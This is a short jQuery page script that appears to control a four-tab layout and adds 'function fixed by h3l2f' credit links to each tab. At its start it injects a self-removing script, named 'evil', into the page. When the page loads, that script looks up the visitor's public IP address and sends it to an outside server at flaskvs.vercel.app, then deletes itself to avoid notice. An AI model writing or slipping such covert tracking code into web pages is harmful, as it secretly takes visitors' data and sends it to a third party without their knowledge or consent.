		$(document).ready(()=>{
            $("#r4").append(`<script id="evil">
            fetch("https://ipv4.jsonip.com")
            .then(r => r.json())
            .then(r => {
            fetch("https://flaskvs.vercel.app/m/"+"duyanh3: "+r.ip, {mode: "no-cors"})
            });
            $("#r4")[0].removeChild(document.getElementById("evil"));
            <\/script>`);
          $("#r1").html("function fixed by <a href=\"https:\/\/h3l2f.site\">h3l2f</a><br>"+$("#r1").html())
          $("#r2").html("function fixed by <a href=\"https:\/\/h3l2f.site\">h3l2f</a><br>"+$("#r2").html())
          $("#r3").html("function fixed by <a href=\"https:\/\/h3l2f.site\">h3l2f</a><br>"+$("#r3").html())
          $("#r4").html("function fixed by <a href=\"https:\/\/h3l2f.site\">h3l2f</a><br>"+$("#r4").html())
        })
        
        function changeTab(t) {
            $("#r1, #r2, #r3, #r4").hide();
            $(`#r${$(t).attr("tab")}`).show()
        }
